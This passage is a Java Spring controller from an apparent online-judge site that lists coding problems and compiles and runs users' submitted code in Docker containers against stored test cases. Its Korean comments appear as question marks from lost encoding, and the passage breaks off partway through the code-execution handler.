package org.dms.web;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import javax.servlet.http.HttpSession;
import org.dms.web.domain.CategoryVO;
import org.dms.web.domain.CodeVO;
import org.dms.web.domain.Criteria;
import org.dms.web.domain.PageMaker;
import org.dms.web.domain.ProblemVO;
import org.dms.web.domain.TestcaseVO;
import org.dms.web.domain.UserVO;
import org.dms.web.service.CategoryService;
import org.dms.web.service.CodeService;
import org.dms.web.service.ProblemService;
import org.dms.web.service.TestcaseService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

@Controller
public class ProblemController {

	@Autowired(required = true)
	ProblemService problemService;
	@Autowired(required = true)
	TestcaseService testcaseService;
	@Autowired(required = true)
	CategoryService categoryService;
	@Autowired(required = true)
	CodeService codeService;

	@RequestMapping(value = "/problem", method = RequestMethod.GET)

	public String test(Locale locale, Model model, Criteria cri, HttpSession session) throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		if (user == null) {
			List<ProblemVO> pvo = problemService.readProblemList(cri);
			List<CategoryVO> cvo = categoryService.readCategoryList();

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(problemService.ProblemCount());

			model.addAttribute("category", cvo);
			model.addAttribute("problem", pvo);
			model.addAttribute("pageMaker", pageMaker);
			model.addAttribute("cri", cri);
			return "menutest";

		} else {
			List<ProblemVO> pvo = problemService.readProblemList(cri);
			List<CategoryVO> cvo = categoryService.readCategoryList();

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(problemService.ProblemCount());

			model.addAttribute("category", cvo);
			model.addAttribute("user", user);
			model.addAttribute("problem", pvo);
			model.addAttribute("pageMaker", pageMaker);
			model.addAttribute("cri", cri);

			model.addAttribute("successList", successList);

			return "menutest";

		}

	}

	@RequestMapping(value = "/problem.do", method = RequestMethod.GET)
	@ResponseBody
	public Map<String, Object> categorytest_test(HttpSession session, Locale locale, Model model, Criteria cri,
			int problem_level, String category_name, boolean isSearch) throws Exception {

		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");

		if (problem_level == 0 && category_name.equals("unselected")) {
			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			;
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemList(searchType, searchInput, cri);
				count = problemService.searchProblemCount(searchType, searchInput);
			} else {
				pvo = problemService.readProblemList(cri);
				count = problemService.ProblemCount();
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			return map;
		} else if (problem_level != 0 && category_name.equals("unselected")) {

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemListByLevel(searchType, searchInput, problem_level, cri);
				count = problemService.searchProblemCountByLevel(searchType, searchInput, problem_level);
			} else {
				pvo = problemService.readProblemList(problem_level, cri);
				count = pvo.size();
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);
			map.put("successList", successList);

			return map;
		} else if (problem_level == 0 && category_name != "unselected") {

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();

			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemListByCategory(searchType, searchInput, category_name, cri);
				count = problemService.searchProblemCountByCategory(searchType, searchInput, category_name);
			} else {
				pvo = problemService.readProblemList(category_name, cri);
				count = problemService.ProblemCount(category_name);
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			return map;
		} else {

			List<ProblemVO> pvo = new ArrayList<ProblemVO>();
			;
			int count = 0;
			String searchInput = (String) session.getAttribute("searchInput");
			String searchType = (String) session.getAttribute("searchType");

			if (isSearch) {
				pvo = problemService.searchProblemListByCategoryAndLevel(searchType, searchInput, category_name,
						problem_level, cri);
				count = problemService.searchProblemCountByCategoryAndLevel(searchType, searchInput, category_name,
						problem_level);
			} else {
				pvo = problemService.readProblemList(problem_level, category_name, cri);
				count = problemService.ProblemCount(problem_level, category_name);
			}

			PageMaker pageMaker = new PageMaker();
			cri.setPerPageNum(8);
			pageMaker.setCri(cri);
			pageMaker.setTotalCount(count);

			boolean[] successList = new boolean[8];
			int index = 0;

			for (ProblemVO problem : pvo) {
				successList[index++] = codeService.IsSuccess(user.getUser_id(), problem.getProblem_id());
			}

			map.put("pageMaker", pageMaker);
			map.put("list", pvo);
			map.put("successList", successList);

			return map;
		}
	}

	@RequestMapping(value = "/problem/{problem_id}", method = RequestMethod.GET)
	public String problemGet(@PathVariable("problem_id") int problem_id, Model model, HttpSession session)
			throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		ProblemVO pvo = problemService.readProblem(problem_id);
		TestcaseVO tvo = testcaseService.readTestcase(problem_id);

		session.setAttribute("problem_id", problem_id);
		model.addAttribute("user", user);
		model.addAttribute("problem", pvo);
		model.addAttribute("testcase", tvo);

		return "solve_page_test";
	}

	@RequestMapping(value = "/problem/insert", method = RequestMethod.GET)
	public String problemInsert(Locale locale, Model model, HttpSession session) throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		List<CategoryVO> vo = categoryService.readCategoryList();
		model.addAttribute("user", user);
		model.addAttribute("category", vo);
		return "problem_insert";
	}

	@RequestMapping(value = "/problem/insert.do", method = RequestMethod.POST)
	public String problemInsertPost(
			@ModelAttribute("problem") ProblemVO pvo /* , @ModelAttribute("testcase") TestcaseVO tvo */)
			throws Exception {
		pvo.setProblem_content(pvo.getProblem_content().replace("\r\n", "<br>"));
		pvo.setProblem_hint(" ??? ????????????  ??? ???");
		pvo.setProblem_failnum(pvo.getProblem_submitnum() - pvo.getProblem_successnum());
		problemService.insertProblem(pvo);
		return "redirect:/problem/insert";
	}

	@RequestMapping(value = "/testcase", method = RequestMethod.GET)
	public String testcaseInsert(Locale locale, Model model, HttpSession session) throws Exception {
		UserVO user = (UserVO) session.getAttribute("user");
		model.addAttribute("user", user);
		return "testcase_insert";
	}

	@RequestMapping(value = "/testcase.do", method = RequestMethod.POST)
	public String testcaseInsertPost(@ModelAttribute("testcase") TestcaseVO tvo) throws Exception {

		tvo.setTestcase_input(tvo.getTestcase_input().replace("\r\n", "<br>"));
		tvo.setTestcase_output(tvo.getTestcase_output().replace("\r\n", "<br>"));

		testcaseService.insertTestcase(tvo);
		return "redirect:/testcase";
	}

	@RequestMapping(value = "/submit", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> getSubmit(String code, String lang, HttpSession session) throws Exception {
		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");
		// problem_id
		int problem_id = (Integer) session.getAttribute("problem_id"); // ??????_id ?????? ??????

		// lang ????????? , code??? ????????? ??????

		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		Calendar cal = Calendar.getInstance();
		String today = null;
		today = formatter.format(cal.getTime());
		Timestamp ts = Timestamp.valueOf(today);

		// ?????? ????????? ??????????????? ??????
		String dockerName = "";
		byte success = 0;

		// ?????? ????????????
		double timeAvg = 0;

		String docker = Reader("/usr/local/apache/docker/docker.txt");
		FileWriter dockerCycle = new FileWriter("/usr/local/apache/docker/docker.txt");

		ArrayList<String> dockerNum = new ArrayList<String>();

		// shellCmd("sh /usr/local/apache/docker/check.sh");

		if (Reader("/usr/local/apache/docker/check01.txt").contains("kko01")) {
			dockerNum.add("kko01");
		}
		if (Reader("/usr/local/apache/docker/check02.txt").contains("kko02")) {
			dockerNum.add("kko02");
		}
		if (Reader("/usr/local/apache/docker/check03.txt").contains("kko03")) {
			dockerNum.add("kko03");
		}
		// int length = dockerNum.size();

		if (dockerNum.size() == 1) {
			dockerName = dockerNum.get(0);
			dockerCycle.write(dockerNum.get(0));
			dockerCycle.close();
		} else if (dockerNum.size() == 2) {
			if (docker.indexOf(dockerNum.get(0)) != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write(dockerNum.get(1));
				dockerCycle.close();
			} else if (docker.indexOf(dockerNum.get(1)) != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write(dockerNum.get(0));
				dockerCycle.close();
			}
		} else if (dockerNum.size() == 3) {
			if (docker.indexOf("kko01") != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			} else if (docker.indexOf("kko02") != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write("kko03");
				dockerCycle.close();
			} else if (docker.indexOf("kko03") != -1) {
				dockerName = dockerNum.get(2);
				dockerCycle.write("kko01");
				dockerCycle.close();
			} else {
				docker = "kko01";
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			}
		}
		// ????????????

		// user_id
		String user_id = user.getUser_id(); // user_id ?????? ??????

		// input, output ???????????? ????????????.
		List<String> tvoInput = testcaseService.getTestCaseInput(problem_id); // ?????????
		List<String> tvoOutput = testcaseService.getTestCaseOutput(problem_id); // ?????????

		File algoTestOld;

		int check = 0;
		String result = "<br>";
		String codeCheck = midSearch(code);
		if (codeCheck.equals("?????????????????????.")) {
			result = "&nbsp;&nbsp;<span style='color:#E06B74'>" + codeCheck + "</span>";
		} else {

			// String cnp = "kko01";
			try {

				if (lang.equals("c")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.c");
					codew.write(code);
					codew.close();

					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write("docker exec " + dockerName + " sh -c 'cd data; gcc -o algotest algotest.c'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh"); // shellcmd??? ?????? ?????? ????????? ?????????
					// sh?????? ?????? ??????
					timeCheck("./algotest");
					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close(); // ????????? txt????????? ???
						String tmp = "";
						// String cnp = "";
						try {
							tmp = shellCmd("sh /usr/local/apache/share/algoMid_c.sh"); // shellcmd??? ?????? ?????? ????????? ????????? sh??????
																						// ?????? ??????
							// ???????????? ?????? ????????? ??????????????? ???????????? ?????????
							tmp = tmp.replace(dockerName, ""); // ???????????? ?????? ????????? ??????????????? ???????????? ?????????

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();

				} else if (lang.equals("c++")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.cpp");
					codew.write(code);
					codew.close();

					timeCheck("./algotest");
					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write(
							"docker exec " + dockerName + " sh -c 'cd data; g++ -std=c++14 algotest.cpp -o algotest'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close(); // ????????? txt????????? ???
						String tmp = "";
						try {
							tmp = shellCmd("sh /usr/local/apache/share/algoMid_c.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("java")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.class");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.class");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.java");
					codew.write(code);
					codew.close();

					FileWriter algo_java = new FileWriter("/usr/local/apache/share/algo_java.sh");
					algo_java.write("docker restart " + dockerName + "\n");
					algo_java.write("docker exec " + dockerName
							+ " sh -c 'export LC_ALL=C.UTF-8; cd data; javac -encoding utf-8 algotest.java'");
					algo_java.close();
					shellCmd("sh /usr/local/apache/share/algo_java.sh"); // shellcmd??? ?????? ?????? ????????? ????????? sh?????? ?????? ?????? --> ?????? ??????

					timeCheck("java -Dfile.encoding=utf-8 algotest");
					FileWriter algoMid_java = new FileWriter("/usr/local/apache/share/algoMid_java.sh");
					algoMid_java.write("docker restart " + dockerName + "\n");
					algoMid_java.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_java.write("docker stop " + dockerName + "\n");
					algoMid_java.close();
					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh /usr/local/apache/share/algoMid_java.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("python")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.py");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.py");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.py");
					codew.write("# -*- coding: utf-8 -*-\n" + code);
					codew.close();

					timeCheck("python3 algotest.py");
					FileWriter algoMid_python = new FileWriter("/usr/local/apache/share/algoMid_python.sh");
					algoMid_python.write("docker restart " + dockerName + "\n");
					algoMid_python.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_python.write("docker stop " + dockerName + "\n");
					algoMid_python.close();

					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh /usr/local/apache/share/algoMid_python.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}
							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				} else if (lang.equals("javascript")) {
					algoTestOld = new File("/usr/local/apache/share/algotest.js");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest.js");
					}
					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.js");
					codew.write(code);
					codew.close();

					timeCheck("js algotest.js");
					FileWriter algoMid_js = new FileWriter("/usr/local/apache/share/algoMid_js.sh");
					algoMid_js.write("docker restart " + dockerName + "\n");
					algoMid_js.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_js.write("docker stop " + dockerName + "\n");
					algoMid_js.close();

					for (int i = 0; i < tvoOutput.size(); i++) {
						FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
						testinput.write(tvoInput.get(i));
						testinput.close();
						String tmp = "";
						try {
							tmp = shellCmd("sh /usr/local/apache/share/algoMid_js.sh");
							tmp = tmp.replace(dockerName, "");

							if (tmp.length() > 4) {

								if (!tmp.substring(tmp.length() - 4, tmp.length()).equals("<br>")) {
									tmp = tmp + "<br>";
								}
							}

							result = result + "&nbsp;&nbsp;>&nbsp;Testcase&nbsp;[&nbsp;" + (i + 1) + "&nbsp;]&nbsp;";

						} catch (Exception e) {
							result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
						}

						if (tmp.equals("<br>" + tvoOutput.get(i) + "<br>")) {
							check++;
							result = result + "&nbsp;<span style='color:#7BC379'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";

							String cnp = Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "");
							cnp = cnp.replace("sec", "");
							timeAvg = timeAvg + Double.parseDouble(cnp);

						} else {
							result = result + "&nbsp;<span style='color:#E06B74'>??????</span>&nbsp;&nbsp;"
									+ Reader("/usr/local/apache/share/timeCheck.txt").replace("<br>", "") + "<br>";
						}
					}
					timeAvg = timeAvg / tvoOutput.size();
				}

			} catch (Exception e) {

				result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
			}

			if (check == tvoOutput.size()) {
				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>&nbsp;???????????????&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;??????&nbsp;:&nbsp;" + today + "&nbsp;<br>";

				result = result + "<br>&nbsp;&nbsp;<span style='color:#7BC379'>>>>>>>&nbsp;?????? ????????????&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;??????&nbsp;:&nbsp;" + timeAvg + "&nbsp;sec<br>";
				success = 1;
			} else {
				result = result + "<br>&nbsp;&nbsp;<span style='color:#E06B74'>>>>>>>&nbsp;???????????????&nbsp;<<<<<<<br>";
				result = result + "&nbsp;&nbsp;>&nbsp;??????&nbsp;:&nbsp;" + today + "&nbsp;</span><br>";
			}

			result = result + "<br>&nbsp;&nbsp;>>>>>>>&nbsp;??????ID&nbsp;<<<<<<<<br>";
			result = result + "&nbsp;&nbsp;>&nbsp;user&nbsp;:&nbsp;" + user_id + "&nbsp;<br>";

		}

		if (success == 1) {
			problemService.addSuccess(problem_id);
		}

		// ????????? ???????????? ??????
		problemService.addSubmit(problem_id);

		CodeVO codevo = new CodeVO();
		codevo.setCode_code(code);
		codevo.setCode_date(ts);
		codevo.setCode_language(lang);
		codevo.setCode_success(success);
		codevo.setUser_id(user_id);
		codevo.setProblem_id(problem_id);

		map.put("result", result);
		codeService.submitCode(codevo);
		return map;

	}

	@RequestMapping(value = "/execute", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> getExecute(String code, String lang, HttpSession session) throws Exception {
		Map<String, Object> map = new HashMap<String, Object>();
		UserVO user = (UserVO) session.getAttribute("user");

		int problem_id = (Integer) session.getAttribute("problem_id");

		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		Calendar cal = Calendar.getInstance();
		String today = null;
		today = formatter.format(cal.getTime());

		String dockerName = "";

		String docker = Reader("/usr/local/apache/docker/docker.txt");
		FileWriter dockerCycle = new FileWriter("/usr/local/apache/docker/docker.txt");

		ArrayList<String> dockerNum = new ArrayList<String>();

		// shellCmd("sh /usr/local/apache/docker/check.sh");

		if (Reader("/usr/local/apache/docker/check01.txt").contains("kko01")) {
			dockerNum.add("kko01");
		}
		if (Reader("/usr/local/apache/docker/check02.txt").contains("kko02")) {
			dockerNum.add("kko02");
		}
		if (Reader("/usr/local/apache/docker/check03.txt").contains("kko03")) {
			dockerNum.add("kko03");
		}
		int length = dockerNum.size();

		if (length == 1) {
			dockerName = dockerNum.get(0);
			dockerCycle.write(dockerNum.get(0));
			dockerCycle.close();
		} else if (length == 2) {
			if (docker.indexOf(dockerNum.get(0)) != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write(dockerNum.get(1));
				dockerCycle.close();
			} else if (docker.indexOf(dockerNum.get(1)) != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write(dockerNum.get(0));
				dockerCycle.close();
			}
		} else if (length == 3) {
			if (docker.indexOf("kko01") != -1) {
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			} else if (docker.indexOf("kko02") != -1) {
				dockerName = dockerNum.get(1);
				dockerCycle.write("kko03");
				dockerCycle.close();
			} else if (docker.indexOf("kko03") != -1) {
				dockerName = dockerNum.get(2);
				dockerCycle.write("kko01");
				dockerCycle.close();
			} else {
				docker = "kko01";
				dockerName = dockerNum.get(0);
				dockerCycle.write("kko02");
				dockerCycle.close();
			}
		}

		String user_id = user.getUser_id();

		List<String> tvoInput = testcaseService.getTestCaseInput(problem_id);
		List<String> tvoOutput = testcaseService.getTestCaseOutput(problem_id);

		File algoTestOld;

		String result = "<br>";
		String checkcheck = midSearch(code);
		if (checkcheck.equals("?????????????????????.")) {
			result = result + checkcheck;

		} else {
			result = result + "&nbsp;&nbsp;<span style='color:#7979D3'>>>>>>>&nbsp;??????&nbsp;<<<<<<<br>";
			if (tvoInput.size() != 0) {
				result = result + "&nbsp;&nbsp;" + tvoInput.get(0) + "<br><br>";
			} else {
				result = result + "&nbsp;&nbsp;????????? ??????<br><br>";
			}
			result = result + "&nbsp;&nbsp;>>>>>>&nbsp;??????&nbsp;<<<<<<<br>";
			if (tvoOutput.size() != 0) {
				result = result + "&nbsp;&nbsp;" + tvoOutput.get(0).replace("<br>", "<br>&nbsp;&nbsp;")
						+ "</span><br><br>";
			} else {
				result = result + "&nbsp;&nbsp;????????? ??????</span><br><br>";
			}
			result = result + "&nbsp;&nbsp;>>>>>>&nbsp;??????&nbsp;<<<<<<";

			try {

				if (lang.equals("c")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.c");
					codew.write(code);
					codew.close();

					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");

					/////
					algo_c.write("docker exec " + dockerName
							+ " sh -c 'cd data; gcc -o algotest algotest.c 2> compileError.txt'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					timeCheck("./algotest");
					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
					testinput.write(tvoInput.get(0));
					testinput.close();
					String tmp = "";

					try {

						tmp = shellCmd("sh /usr/local/apache/share/algoMid_c.sh");
						String compileError = Reader("/usr/local/apache/share/compileError.txt");
						if (compileError.length() < 5 && tmp.length() != 0) {

							tmp = tmp.replace(dockerName, "");
							tmp = tmp.replace("<br>", "<br>&nbsp;&nbsp;");
							tmp = tmp.replace(" ", "&nbsp;");
							result = result + tmp;
						} else {
							compileError = compileError.replace(" ", "&ensp;");
							compileError = compileError.replace("<br>", "<br>&ensp;&ensp;");

							result = result + "<span style='color:#E06B74'>" + compileError + "</span><br>";
						}

					} catch (Exception e) {

						result = result + "&nbsp;&nbsp;<span style='color:#E06B74'>????????????</span>";
					}

				} else if (lang.equals("c++")) {
					algoTestOld = new File("/usr/local/apache/share/algotest");
					if (algoTestOld.exists()) {
						shellCmd("rm -r /usr/local/apache/share/algotest");
					}

					FileWriter codew = new FileWriter("/usr/local/apache/share/algotest.cpp");
					codew.write(code);
					codew.close();

					timeCheck("./algotest");
					FileWriter algo_c = new FileWriter("/usr/local/apache/share/algo_c.sh");
					algo_c.write("docker restart " + dockerName + "\n");
					algo_c.write("docker exec " + dockerName
							+ " sh -c 'cd data; g++ -std=c++14  algotest.cpp -o algotest 2> compileError.txt'");
					algo_c.close();
					shellCmd("sh /usr/local/apache/share/algo_c.sh");

					FileWriter algoMid_c = new FileWriter("/usr/local/apache/share/algoMid_c.sh");
					algoMid_c.write("docker restart " + dockerName + "\n");
					algoMid_c.write("docker exec " + dockerName + " sh -c 'cd data; sh ./timeCheck.sh'" + "\n");
					algoMid_c.write("docker stop " + dockerName + "\n");
					algoMid_c.close();

					FileWriter testinput = new FileWriter("/usr/local/apache/share/testinput");
